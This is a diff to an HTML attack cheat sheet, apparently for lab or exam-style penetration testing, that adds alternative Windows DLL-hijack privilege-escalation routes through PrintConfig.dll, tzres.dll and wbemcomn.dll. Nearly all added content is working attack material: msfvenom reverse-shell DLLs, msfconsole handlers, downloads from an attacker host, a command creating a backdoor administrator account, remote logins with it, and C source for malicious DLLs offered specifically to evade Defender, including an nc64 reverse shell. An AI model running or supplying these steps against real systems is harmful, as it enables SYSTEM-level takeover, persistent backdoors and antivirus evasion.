@@ -1369,17 +1369,182 @@ $object = [Activator]::CreateInstance($type)
 # Shell arrives on Kali listener as SYSTEM</div>
             </div>
           </div>
-          <div class="alert alert-gold">
-            <span class="alert-icon">⚠️</span>
-            <span>DLL path must be EXACTLY: <code>C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll</code> — case-sensitive, no variation.</span>
+          <div class="alert alert-red">
+            <span class="alert-icon">⚠</span>
+            <span><strong>DLL path must be EXACTLY:</strong> <code>C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll</code> — case-sensitive, no variation. Also: <strong>trigger AFTER the DLL is in place</strong>, not before. If you triggered too early, the Spooler process caches the path — use the tzres.dll or AddUser alternatives below instead.</span>
           </div>
-          <div class="alert alert-gold">
-            <span class="alert-icon">💡</span>
-            <span><strong>Alternative DLL hijack paths</strong> (the C:\ write opens many options):<br>
-            • <code>C:\Windows\System32\wbem\tzres.dll</code> → trigger: run <code>systeminfo</code><br>
-            • <code>C:\Windows\System32\wbem\wbemcomn.dll</code> → trigger: <code>sc restart iphlpsvc</code><br>
-            • <code>C:\Windows\System32\dxgi.dll</code> → trigger: launch any DirectX app</span>
+          <div class="alert alert-red">
+            <span class="alert-icon">⚠</span>
+            <span><strong>Raw nc may receive garbled binary data</strong> when the DLL payload runs inside a COM-hosted process. The shell IS connecting but nc can't render Windows I/O correctly. <strong>Use msfconsole multi/handler instead of raw nc</strong> — see Alternative 1 below.</span>
           </div>
+        </div>
+      </div>
+
+      <!-- ALTERNATIVE 1: msfconsole handler -->
+      <div class="section">
+        <div class="section-header">🔁 If nc receives garbled data — use msfconsole handler</div>
+        <div class="section-body">
+          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>Raw <code>nc -lvnp</code> sometimes gets binary garbage when <code>shell_reverse_tcp</code> runs inside a DLL loaded by a COM server. The shell connected — nc just can't handle Windows shell I/O. Replace nc with <code>msfconsole multi/handler</code>.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Kali — start handler (instead of nc)</div>
+            <div class="code-block green">msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {{RPORT}}; run"</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Re-trigger from Windows (DLL is already in place)</div>
+            <div class="code-block purple">$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$object = [Activator]::CreateInstance($type)
+# OR if using tzres.dll path:
+systeminfo</div>
+          </div></div>
+        </div>
+      </div>
+
+      <!-- ALTERNATIVE 2: AddUser DLL (no network dependency) -->
+      <div class="section">
+        <div class="section-header">🔁 Alternative 2 — AddUser DLL (most reliable — no network needed)</div>
+        <div class="section-body">
+          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>Instead of a reverse shell DLL, generate a DLL that adds a local admin user. No listener, no connection issues, no AV evasion needed. Then log in via evil-winrm, RDP, or impacket.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Kali — generate AddUser DLL</div>
+            <div class="code-block purple">msfvenom -p windows/x64/exec \
+  CMD='cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add' \
+  -f dll -o AddUser.dll
+python3 -m http.server {{PORT}}</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Windows — download and place as PrintConfig.dll or tzres.dll</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/AddUser.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"
+# OR place as tzres.dll for systeminfo trigger:
+iwr http://{{KALI_IP}}:{{PORT}}/AddUser.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"</div>
+          </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Windows — trigger the DLL load</div>
+            <div class="code-block purple"># For PrintConfig path:
+$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$object = [Activator]::CreateInstance($type)
+# For tzres.dll path:
+systeminfo</div>
+          </div></div>
+          <div class="step"><div class="step-num">4</div><div class="step-content">
+            <div class="step-title">Windows — verify user created</div>
+            <div class="code-block">net user hacker
+net localgroup administrators</div>
+          </div></div>
+          <div class="step"><div class="step-num">5</div><div class="step-content">
+            <div class="step-title">Kali — log in as new admin</div>
+            <div class="code-block green">evil-winrm -i {{TARGET}} -u hacker -p 'P@ss123!'
+# OR:
+impacket-psexec hacker:'P@ss123!'@{{TARGET}}</div>
+          </div></div>
+        </div>
+      </div>
+
+      <!-- ALTERNATIVE 3: tzres.dll full steps -->
+      <div class="section">
+        <div class="section-header">🔁 Alternative 3 — tzres.dll + systeminfo trigger (full steps)</div>
+        <div class="section-body">
+          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>If the PrintNotify CLSID has already cached a bad DLL load and you can't restart Spooler, use the <code>tzres.dll</code> path instead. Triggered by running <code>systeminfo</code> — loads tzres.dll as SYSTEM.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Kali — generate tzres.dll payload (or reuse existing PrintConfig.dll)</div>
+            <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o tzres.dll
+python3 -m http.server {{PORT}}</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Windows — place tzres.dll (C:\ is already writable from exploit step)</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
+# Verify it's there:
+Get-Item "C:\Windows\System32\wbem\tzres.dll" | Select-Object Length,LastWriteTime</div>
+          </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Kali — start msfconsole handler BEFORE triggering</div>
+            <div class="code-block green">msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {{RPORT}}; run"</div>
+          </div></div>
+          <div class="step"><div class="step-num">4</div><div class="step-content">
+            <div class="step-title">Windows — trigger: systeminfo loads tzres.dll as SYSTEM</div>
+            <div class="code-block purple">systeminfo
+# Shell arrives on msfconsole as NT AUTHORITY\SYSTEM</div>
+          </div></div>
+        </div>
+      </div>
+
+      <!-- ALTERNATIVE 4: wbemcomn.dll + iphlpsvc -->
+      <div class="section">
+        <div class="section-header">🔁 Alternative 4 — wbemcomn.dll + sc restart iphlpsvc</div>
+        <div class="section-body">
+          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>IP Helper service (iphlpsvc) loads wbemcomn.dll on restart. Works when you have permission to restart the service.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Kali — generate wbemcomn.dll</div>
+            <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o wbemcomn.dll
+python3 -m http.server {{PORT}}</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Windows — place the DLL</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/wbemcomn.dll -OutFile "C:\Windows\System32\wbemcomn.dll"</div>
+          </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Kali — start handler</div>
+            <div class="code-block green">msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {{RPORT}}; run"</div>
+          </div></div>
+          <div class="step"><div class="step-num">4</div><div class="step-content">
+            <div class="step-title">Windows — trigger by restarting iphlpsvc</div>
+            <div class="code-block purple">sc.exe stop iphlpsvc
+sc.exe start iphlpsvc
+# If access denied, try: Restart-Service -Name iphlpsvc -Force</div>
+          </div></div>
+        </div>
+      </div>
+
+      <!-- ALTERNATIVE 5: Custom mingw DLL (no msfvenom / AV evasion) -->
+      <div class="section">
+        <div class="section-header">🔁 Alternative 5 — Custom compiled DLL (no msfvenom — bypasses AV)</div>
+        <div class="section-body">
+          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>msfvenom DLLs are signatured by Defender. Compile a minimal DLL with mingw-w64 — either adds a user or runs nc64.exe. Much better AV evasion.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Kali — write the C source (AddUser variant — no network needed)</div>
+            <div class="code-block purple">cat &gt; /tmp/evil.c &lt;&lt; 'EOF'
+#include &lt;windows.h&gt;
+BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        system("cmd /c net user hacker P@ss123! /add");
+        system("cmd /c net localgroup administrators hacker /add");
+    }
+    return TRUE;
+}
+EOF</div>
+          </div></div>
+          <div class="step"><div class="step-num">1b</div><div class="step-content">
+            <div class="step-title">Kali — nc64.exe variant (reverse shell, no msfvenom)</div>
+            <div class="code-block purple">cat &gt; /tmp/evil.c &lt;&lt; 'EOF'
+#include &lt;windows.h&gt;
+BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        WinExec("C:\\Users\\Public\\Documents\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd", SW_HIDE);
+    }
+    return TRUE;
+}
+EOF</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Kali — compile with mingw-w64</div>
+            <div class="code-block purple">x86_64-w64-mingw32-gcc -shared -o PrintConfig.dll /tmp/evil.c -lws2_32
+# Or for tzres path:
+x86_64-w64-mingw32-gcc -shared -o tzres.dll /tmp/evil.c -lws2_32
+python3 -m http.server {{PORT}}</div>
+          </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Windows — upload nc64.exe first (if using shell variant), then DLL</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -o C:\Users\Public\Documents\nc64.exe
+iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</div>
+          </div></div>
+          <div class="step"><div class="step-num">4</div><div class="step-content">
+            <div class="step-title">Kali — listener (use nc for the WinExec/nc64 variant)</div>
+            <div class="code-block green">nc -lvnp {{RPORT}}</div>
+          </div></div>
+          <div class="step"><div class="step-num">5</div><div class="step-content">
+            <div class="step-title">Windows — trigger</div>
+            <div class="code-block purple">$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$object = [Activator]::CreateInstance($type)</div>
+          </div></div>
         </div>
       </div>
 
